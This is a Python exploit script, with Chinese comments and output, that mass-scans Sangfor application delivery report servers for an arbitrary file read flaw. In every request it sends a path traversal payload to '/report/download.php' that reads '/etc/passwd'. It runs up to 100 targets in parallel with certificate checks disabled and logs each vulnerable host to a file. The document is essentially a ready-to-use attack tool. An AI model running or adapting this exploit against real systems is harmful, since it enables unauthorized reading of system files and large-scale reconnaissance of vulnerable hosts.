import requests,re,argparse,os,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    banner = '''
      _                     _        __       _                 _     _             
     | |                   (_)      / _|     | |               | |   (_)            
  ___| |__   ___ _ __ __  ___ _ __ | |_ _   _| |__   __ _  ___ | |__  _  __ _  ___  
 / __| '_ \ / _ \ '_ \\ \/ / | '_ \|  _| | | | '_ \ / _` |/ _ \| '_ \| |/ _` |/ _ \ 
 \__ \ | | |  __/ | | |>  <| | | | | | | |_| | |_) | (_| | (_) | |_) | | (_| | (_) |
 |___/_| |_|\___|_| |_/_/\_\_|_| |_|_|  \__,_|_.__/ \__,_|\___/|_.__/|_|\__,_|\___/ 
                                                version:深信服应用交付报表系统                                 
                                                                                                               
'''
    print(banner)

def main():
    banner()

    parser = argparse.ArgumentParser(description="深信服报表 任意读取")

    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='fiel path')

    args = parser.parse_args()

    # print(args.url,args.filr)
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join
    else:
        print(f"Useag: \n\tpython:{sys.argv[0]} -h")

def poc(target):
    payload ='/report/download.php?pdf=../../../../../etc/passwd'
    url = target+payload
    header = {
       "User-Agent":"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept":"*/*",
        "Connection":"Keep-Alive",
    }
    try:
        res = requests.get(url=url,headers=header,verify=False,timeout=10)
         # print(res.text)
        if res.status_code == 200 and 'root' in res.text:
            print(f"[+]此url{target}存在漏洞")
            with open('refult.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
        else:
            print(f"[-]此url{target}不存在漏洞")
    except Exception as e:
        print(f"[*]该url{target}可能存在访问问题，请手工测试")
if __name__ == '__main__':
    main()
